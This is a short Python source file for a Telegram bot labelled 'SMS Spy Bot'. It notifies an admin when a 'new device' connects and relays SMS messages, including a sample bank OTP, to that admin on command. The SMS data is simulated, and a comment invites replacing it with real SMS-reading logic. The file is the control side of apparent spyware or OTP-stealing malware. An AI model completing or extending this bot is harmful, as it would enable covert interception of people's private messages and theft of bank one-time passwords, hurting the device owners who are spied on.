import asyncio
import json
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage

# Load config
with open('config.json') as f:
    config = json.load(f)

bot = Bot(token=config['bot_token'])
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    await message.reply("🕵️ SMS Spy Bot - Online")
    # Notify admin
    await bot.send_message(config['admin_chat_id'], "✅ New device connected!")

@dp.message_handler(commands=['getsms'])
async def get_sms_command(message: types.Message):
    if str(message.chat.id) == config['admin_chat_id']:
        # Simulate SMS data - replace with actual SMS reading logic
        sms_data = [
            {"from": "Bank", "message": "OTP: 123456", "time": "12:30"},
            {"from": "Friend", "message": "Hey, call me back", "time": "12:25"}
        ]
        
        for sms in sms_data:
            await message.reply(f"📱 From: {sms['from']}\n💬 {sms['message']}\n⏰ {sms['time']}")
    else:
        await message.reply("❌ Unauthorized")

@dp.message_handler(commands=['status'])
async def status_command(message: types.Message):
    await message.reply("🟢 System Operational - Ready to receive SMS")

async def main():
    await dp.start_polling()

if __name__ == '__main__':
    print("🤖 SMS Spy Bot Starting...")
    asyncio.run(main())
